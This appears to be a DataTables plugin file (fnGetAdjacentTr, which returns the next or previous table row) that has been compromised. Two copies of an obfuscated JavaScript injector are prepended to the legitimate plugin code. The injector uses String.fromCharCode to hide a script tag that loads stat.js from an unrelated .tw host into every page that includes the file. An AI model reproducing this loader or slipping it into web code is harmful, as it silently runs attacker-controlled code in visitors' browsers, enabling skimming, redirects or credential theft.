Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Due to the fact that DataTables moves DOM elements around (mainly `dt-tag tr`
 * elements for sorting and filtering) it can at times be a little tricky to get
 * the next row based on another, while taking into account pagination,
 * filtering, sorting etc.
 * 
 * This function is designed to address exactly this situation. It takes two
 * parameters, the target node, and a boolean indicating if the adjacent row
 * retrieved should be the next (`true`, or no value) or the previous (`false`).
 *
 *  @name fnGetAdjacentTr
 *  @summary Get the adjacent `dt-tag tr` element for a row.
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *
 *  @param {node} nTr `dt-tag tr` element to get the adjacent element of
 *  @param {boolean} [bNext=true] Get the next (`true`), or previous (`false`)
 *    `dt-tag tr` element.
 *  @returns {node} `dt-tag tr` element or null if not found.
 *
 *  @example
 *    $(document).ready(function() {
 *        var table = $('#example').dataTable();
 *         
 *        var n1 = $('#example tbody tr').eq(2)[0];
 *        var next = table.fnGetAdjacentTr( n1 );
 *        var prev = table.fnGetAdjacentTr( n1, false );
 *    } );
 */

jQuery.fn.dataTableExt.oApi.fnGetAdjacentTr  = function ( oSettings, nTr, bNext )
{
	/* Find the node's position in the aoData store */
	var iCurrent = oSettings.oApi._fnNodeToDataIndex( oSettings, nTr );

	/* Convert that to a position in the display array */
	var iDisplayIndex = $.inArray( iCurrent, oSettings.aiDisplay );
	if ( iDisplayIndex == -1 )
	{
		/* Not in the current display */
		return null;
	}

	/* Move along the display array as needed */
	iDisplayIndex += (typeof bNext=='undefined' || bNext) ? 1 : -1;

	/* Check that it within bounds */
	if ( iDisplayIndex < 0 || iDisplayIndex >= oSettings.aiDisplay.length )
	{
		/* There is no next/previous element */
		return null;
	}

	/* Return the target node from the aoData store */
	return oSettings.aoData[ oSettings.aiDisplay[ iDisplayIndex ] ].nTr;
};
